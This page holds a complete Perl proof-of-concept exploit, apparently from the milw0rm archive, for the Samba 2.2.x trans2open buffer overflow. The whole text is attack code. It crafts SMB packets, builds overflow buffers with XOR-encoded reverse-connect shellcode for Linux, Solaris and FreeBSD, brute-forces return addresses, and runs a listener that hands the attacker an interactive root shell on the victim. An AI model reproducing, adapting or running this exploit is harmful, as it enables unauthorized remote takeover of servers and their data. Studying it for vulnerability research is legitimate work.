<html><head><title>Samba 2.2.x Remote Root Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl
###############

##[ Header
#         Name:  trans2root.pl
#      Purpose:  Proof of concept exploit for Samba 2.2.x (trans2open overflow)
#       Author:  H D Moore &lt;hdmoore@digitaldefense.net&gt;
#    Copyright:  Copyright (C) 2003 Digital Defense Inc.
#  trans2root.pl &lt;options&gt; -t &lt;target type&gt; -H &lt;your ip&gt; -h &lt;target ip&gt;
##

use strict;
use Socket;
use IO::Socket;
use IO::Select;
use POSIX;
use Getopt::Std;

$SIG{USR2} = \&amp;GoAway;

my %args;
my %targets =
(
    &quot;linx86&quot;  =&gt; [0xbffff3ff, 0xbfffffff, 0xbf000000, 512, \&amp;CreateBuffer_linx86],
    &quot;solx86&quot;  =&gt; [0x08047404, 0x08047ffc, 0x08010101, 512, \&amp;CreateBuffer_solx86],
    &quot;fbsdx86&quot; =&gt; [0xbfbfefff, 0xbfbfffff, 0xbf000000, 512, \&amp;CreateBuffer_bsdx86],
    # name      # default   # start     # end      # step  # function
);

getopt('t:M:h:p:r:H:P:', \%args);

my $target_type = $args{t} || Usage();
my $target_host = $args{h} || Usage();
my $local_host  = $args{H} || Usage();
my $local_port  = $args{P} || 1981;
my $target_port = $args{p} || 139;

my $target_mode = &quot;brute&quot;;

if (! exists($targets{$target_type})) { Usage(); }
print &quot;[*] Using target type: $target_type\n&quot;;

# allow single mode via the -M option
if ($args{M} &amp;&amp; uc($args{M}) eq &quot;S&quot;)
{
    $target_mode = &quot;single&quot;;
}

# the parent process listens for an incoming connection
# the child process handles the actual exploitation
my $listen_pid = $$;
my $exploit_pid = StartListener($local_port);

# get the default return address for single mode
my $targ_ret = $args{r} || $targets{$target_type}-&gt;[0];
my $curr_ret;
$targ_ret = eval($targ_ret);

if ($target_mode !~ /brute|single/)
{
    print &quot;[*] Invalid attack mode: $target_mode (single or brute only)\n&quot;;
    exit(0);
}


if ($target_mode eq &quot;single&quot;)
{
    $curr_ret = $targ_ret;
    if(! $targ_ret)
    {
       print &quot;[*] Invalid return address specified!\n&quot;;
        kill(&quot;USR2&quot;, $listen_pid);
        exit(0);
    }

    print &quot;[*] Starting single shot mode...\n&quot;;
    printf (&quot;[*] Using return address of 0x%.8x\n&quot;, $targ_ret);
    my $buf = $targets{$target_type}-&gt;[4]-&gt;($local_host, $local_port, $targ_ret);
    my $ret = AttemptExploit($target_host, $target_port, $buf);

    sleep(2);
    kill(&quot;USR2&quot;, $listen_pid);
    exit(0);
}


if ($target_mode eq &quot;brute&quot;)
{
    print &quot;[*] Starting brute force mode...\n&quot;;

    for (
          $curr_ret  =$targets{$target_type}-&gt;[1];
          $curr_ret &gt;= $targets{$target_type}-&gt;[2];
          $curr_ret -=$targets{$target_type}-&gt;[3]
        )
    {
        select(STDOUT); $|++;
        my $buf = $targets{$target_type}-&gt;[4]-&gt;($local_host, $local_port, $curr_ret);
        printf (&quot;                                        \r[*] Return Address: 0x%.8x&quot;, $curr_ret);
        my $ret = AttemptExploit($target_host, $target_port, $buf);
    }
    sleep(2);
    kill(&quot;USR2&quot;, $listen_pid);
    exit(0);
}

sub Usage {

    print STDERR &quot;\n&quot;;
    print STDERR &quot; trans2root.pl - Samba 2.2.x 'trans2open()' Remote Exploit\n&quot;;
    print STDERR &quot;===================================\n\n&quot;;
    print STDERR &quot;    Usage: \n&quot;;
    print STDERR &quot;           $0 &lt;options&gt; -t &lt;target type&gt; -H &lt;your ip&gt; -h &lt;target ip&gt;\n&quot;;
    print STDERR &quot;  Options:  \n&quot;;
    print STDERR &quot;           -M (S|B) &lt;single or brute mode&gt;\n&quot;;
    print STDERR &quot;           -r       &lt;return address for single mode&gt;\n&quot;;
    print STDERR &quot;           -p       &lt;alternate Samba port&gt;\n&quot;;
    print STDERR &quot;           -P       &lt;alternate listener port&gt;\n&quot;;
    print STDERR &quot;  Targets:\n&quot;;
    foreach my $type (keys(%targets))
    {
        print STDERR &quot;            $type\n&quot;;
    }
    print STDERR &quot;\n&quot;;


    exit(1);
}


sub StartListener {
    my ($local_port) = @_;
    my $listen_pid = $$;

    my $s = IO::Socket::INET-&gt;new (
                Proto =&gt; &quot;tcp&quot;,
                LocalPort =&gt; $local_port,
                Type =&gt; SOCK_STREAM,
                Listen =&gt; 3,
                ReuseAddr =&gt; 1
    );

    if (! $s)
    {
        print &quot;[*] Could not start listener: $!\n&quot;;
        exit(0);
    }

    print &quot;[*] Listener started on port $local_port\n&quot;;

    my $exploit_pid = fork();
    if ($exploit_pid)
    {
        my $victim;
        $SIG{USR2} = \&amp;GoAway;

        while ($victim = $s-&gt;accept())
        {
            kill(&quot;USR2&quot;, $exploit_pid);
            print STDOUT &quot;\n[*] Starting Shell &quot; . $victim-&gt;peerhost . &quot;:&quot; . $victim-&gt;peerport . &quot;\n\n&quot;;
            StartShell($victim);
        }
        exit(0);
    }
    return ($exploit_pid);
}

sub StartShell {
    my ($client) = @_;
    my $sel = IO::Select-&gt;new();

    Unblock(*STDIN);
    Unblock(*STDOUT);
    Unblock($client);

    select($client); $|++;
    select(STDIN);   $|++;
    select(STDOUT);  $|++;

    $sel-&gt;add($client);
    $sel-&gt;add(*STDIN);

    print $client &quot;echo \\-\\-\\=\\[ Welcome to `hostname` \\(`id`\\)\n&quot;;
    print $client &quot;echo \n&quot;;

    while (fileno($client))
    {
        my $fd;
        my @fds = $sel-&gt;can_read(0.2);

        foreach $fd (@fds)
        {
            my @in = &lt;$fd&gt;;

            if(! scalar(@in)) { next; }

            if (! $fd || ! $client)
            {
                print &quot;[*] Closing connection.\n&quot;;
                close($client);
                exit(0);
            }

            if ($fd eq $client)
            {
                print STDOUT join(&quot;&quot;, @in);
            } else {
                print $client join(&quot;&quot;, @in);
            }
        }
    }
    close ($client);
}

sub AttemptExploit {
    my ($Host, $Port, $Exploit) = @_;
    my $res;

    my $s = IO::Socket::INET-&gt;new(PeerAddr =&gt; $Host, PeerPort =&gt; $Port, Type
  =&gt; SOCK_STREAM, Protocol =&gt; &quot;tcp&quot;);

    if (! $s)
    {
        print &quot;\n[*] Error: could not connect: $!\n&quot;;
        kill(&quot;USR2&quot;, $listen_pid);
        exit(0);
    }

    select($s); $|++;
    select(STDOUT); $|++;
    Unblock($s);

    my $SetupSession =
        &quot;\x00\x00\x00\x2e\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x08&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01&quot;.
        &quot;\x00\x00\x00\x00&quot;;

    my $TreeConnect =
        &quot;\x00\x00\x00\x3c\xff\x53\x4d\x42\x70\x00\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00&quot;.
        &quot;\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24&quot;.
        &quot;\x25\x6e\x6f\x62\x6f\x64\x79\x00\x00\x00\x00\x00\x00\x00\x49\x50&quot;.
        &quot;\x43\x24&quot;;

    my $Flush = (&quot;\x00&quot; x 808);

    print $s $SetupSession;
    $res = ReadResponse($s);

    print $s $TreeConnect;
    $res = ReadResponse($s);

    # uncomment this for diagnostics
    #print &quot;[*] Press Enter to Continue...\n&quot;;
    #$res = &lt;STDIN&gt;;

    #print &quot;[*] Sending Exploit Buffer...\n&quot;;

    print $s $Exploit;
    print $s $Flush;

    ReadResponse($s);
    close($s);
}

sub CreateBuffer_linx86 {
    my ($Host, $Port, $Return) = @_;

    my $RetAddr =  eval($Return);
    $RetAddr = pack(&quot;l&quot;, $RetAddr);

    my ($a1, $a2, $a3, $a4) = split(//, gethostbyname($Host));
    $a1 = chr(ord($a1) ^ 0x93);
    $a2 = chr(ord($a2) ^ 0x93);
    $a3 = chr(ord($a3) ^ 0x93);
    $a4 = chr(ord($a4) ^ 0x93);

    my ($p1, $p2) = split(//, reverse(pack(&quot;s&quot;, $Port)));
    $p1 = chr(ord($p1) ^ 0x93);
    $p2 = chr(ord($p2) ^ 0x93);

    my $exploit =
        # trigger the trans2open overflow
        &quot;\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00&quot;.
        &quot;\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90&quot;.

        GetNops(772) .

        # xor decoder courtesy of hsj
        &quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01&quot;.
        &quot;\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30&quot;.
        &quot;\x93\x40\xe2\xfa&quot;.

        # reverse-connect, mangled lamagra code + fixes
        &quot;\x1a\x76\xa2\x41\x21\xf5\x1a\x43\xa2\x5a\x1a\x58\xd0\x1a\xce\x6b&quot;.
        &quot;\xd0\x1a\xce\x67\xd8\x1a\xde\x6f\x1e\xde\x67\x5e\x13\xa2\x5a\x1a&quot;.
        &quot;\xd6\x67\xd0\xf5\x1a\xce\x7f\xf5\x54\xd6\x7d&quot;.
        $p1.$p2 .&quot;\x54\xd6\x63&quot;. $a1.$a2.$a3.$a4.
        &quot;\x1e\xd6\x7f\x1a\xd6\x6b\x55\xd6\x6f\x83\x1a\x43\xd0\x1e\xde\x67&quot;.
        &quot;\x5e\x13\xa2\x5a\x03\x18\xce\x67\xa2\x53\xbe\x52\x6c\x6c\x6c\x5e&quot;.
        &quot;\x13\xd2\xa2\x41\x12\x79\x6e\x6c\x6c\x6c\xaa\x42\xe6\x79\x78\x8b&quot;.
        &quot;\xcd\x1a\xe6\x9b\xa2\x53\x1b\xd5\x94\x1a\xd6\x9f\x23\x98\x1a\x60&quot;.
        &quot;\x1e\xde\x9b\x1e\xc6\x9f\x5e\x13\x7b\x70\x6c\x6c\x6c\xbc\xf1\xfa&quot;.
        &quot;\xfd\xbc\xe0\xfb&quot;.

        GetNops(87).

        ($RetAddr x 8).

        &quot;DDI!&quot;. (&quot;\x00&quot; x 277);

    return $exploit;
}

sub CreateBuffer_solx86 {
    my ($Host, $Port, $Return) = @_;

    my $RetAddr =  eval($Return);
    my $IckAddr = $RetAddr - 512;

    $RetAddr = pack(&quot;l&quot;, $RetAddr);
    $IckAddr = pack(&quot;l&quot;, $IckAddr);

    # IckAddr needs to point to a writable piece of memory

    my ($a1, $a2, $a3, $a4) = split(//, gethostbyname($Host));
    $a1 = chr(ord($a1) ^ 0x93);
    $a2 = chr(ord($a2) ^ 0x93);
    $a3 = chr(ord($a3) ^ 0x93);
    $a4 = chr(ord($a4) ^ 0x93);

    my ($p1, $p2) = split(//, reverse(pack(&quot;s&quot;, $Port)));
    $p1 = chr(ord($p1) ^ 0x93);
    $p2 = chr(ord($p2) ^ 0x93);

    my $exploit =
        # trigger the trans2open overflow
        &quot;\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00&quot;.
        &quot;\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90&quot;.

        GetNops(813) .

        # xor decoder courtesy of hsj
        &quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01&quot;.
        &quot;\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30&quot;.
        &quot;\x93\x40\xe2\xfa&quot;.

        # reverse-connect, code by bighawk
        &quot;\x2b\x6c\x6b\x6c\xaf\x64\x43\xc3\xa2\x53\x23\x09\xc3\x1a\x76\xa2&quot;.
        &quot;\x5a\xc2\xd2\xd2\xc2\xc2\x23\x75\x6c\x46\xa2\x41\x1a\x54\xfb&quot;.
        $a1.$a2.$a3.$a4 .&quot;\xf5\xfb&quot;. $p1.$p2.
        &quot;\xf5\xc2\x1a\x75\xf9\x83\xc5\xc4\x23\x78\x6c\x46\xa2\x41\x21\x9a&quot;.
        &quot;\xc2\xc1\xc4\x23\xad\x6c\x46\xda\xea\x61\xc3\xfb\xbc\xbc\xe0\xfb&quot;.
        &quot;\xfb\xbc\xf1\xfa\xfd\x1a\x70\xc3\xc0\x1a\x71\xc3\xc1\xc0\x23\xa8&quot;.
        &quot;\x6c\x46&quot;.

        GetNops(87) .

        &quot;010101&quot;.
        $RetAddr.
        $IckAddr.
        $RetAddr.
        $IckAddr.
        &quot;101010&quot;.

        &quot;DDI!&quot;. (&quot;\x00&quot; x 277);

    return $exploit;
}

sub CreateBuffer_bsdx86 {
    my ($Host, $Port, $Return) = @_;

    my $RetAddr =  eval($Return);
    my $IckAddr = $RetAddr - 512;

    $RetAddr = pack(&quot;l&quot;, $RetAddr);
    $IckAddr = pack(&quot;l&quot;, $IckAddr);

    # IckAddr needs to point to a writable piece of memory

    my ($a1, $a2, $a3, $a4) = split(//, gethostbyname($Host));
    $a1 = chr(ord($a1) ^ 0x93);
    $a2 = chr(ord($a2) ^ 0x93);
    $a3 = chr(ord($a3) ^ 0x93);
    $a4 = chr(ord($a4) ^ 0x93);

    my ($p1, $p2) = split(//, reverse(pack(&quot;s&quot;, $Port)));
    $p1 = chr(ord($p1) ^ 0x93);
    $p2 = chr(ord($p2) ^ 0x93);

    my $exploit =
        # trigger the trans2open overflow
        &quot;\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00&quot;.
        &quot;\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
        &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90&quot;.

        GetNops(830) .

        # xor decoder courtesy of hsj
        &quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01&quot;.
        &quot;\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30&quot;.
        &quot;\x93\x40\xe2\xfa&quot;.

        # reverse-connect, code by bighawk
        &quot;\xa2\x5a\x64\x72\xc2\xd2\xc2\xd2\xc2\xc2\x23\xf2\x5e\x13\x1a\x50&quot;.
        &quot;\xfb&quot;. $a1.$a2.$a3.$a4 .&quot;\xf5\xfb&quot;. $p1.$p2.
        &quot;\xf5\xc2\x1a\x75\x21\x83\xc1\xc5\xc3\xc3\x23\xf1\x5e\x13\xd2\x23&quot;.
        &quot;\xc9\xda\xc2\xc0\xc0\x5e\x13\xd2\x71\x66\xc2\xfb\xbc\xbc\xe0\xfb&quot;.
        &quot;\xfb\xbc\xf1\xfa\xfd\x1a\x70\xc2\xc7\xc0\xc0\x23\xa8\x5e\x13&quot;.

        GetNops(87) .

        &quot;010101&quot;.
        $RetAddr.
        $IckAddr.
        $RetAddr.
        $IckAddr.
        &quot;101010&quot;.

        &quot;DDI!&quot;. (&quot;\x00&quot; x 277);

    return $exploit;
}

sub Unblock {
        my $fd = shift;
        my $flags;
        $flags = fcntl($fd,F_GETFL,0) || die &quot;Can't get flags for file handle: $!\n&quot;;
        fcntl($fd, F_SETFL, $flags|O_NONBLOCK) || die &quot;Can't make handle nonblocking: $!\n&quot;;
}

sub GoAway {
    exit(0);
}

sub ReadResponse {
    my ($s) = @_;
    my $sel = IO::Select-&gt;new($s);
    my $res;
    my @fds = $sel-&gt;can_read(4);
    foreach (@fds) { $res .= &lt;$s&gt;; }
    return $res;
}

sub HexDump {
    my ($data) = @_;
    my @x = split(//, $data);
    my $cnt = 0;

    foreach my $h (@x)
    {
        if ($cnt &gt; 16)
        {
            print &quot;\n&quot;;
            $cnt = 0;
        }

        printf(&quot;\\x%.2x&quot;, ord($h));
        $cnt++;
    }
    print &quot;\n&quot;;
}

# thank you k2 ;)
sub GetNops {
    my ($cnt) = @_;
    my @nops = split(//,&quot;\x99\x96\x97\x95\x93\x91\x90\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97&quot;.
                        &quot;\x46\x4e\xf8\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b&quot;.
                        &quot;\xf5\x45\x4c&quot;);
    return join (&quot;&quot;, @nops[ map { rand @nops } ( 1 .. $cnt )]);
}



# milw0rm.com [2003-04-07]</pre></html>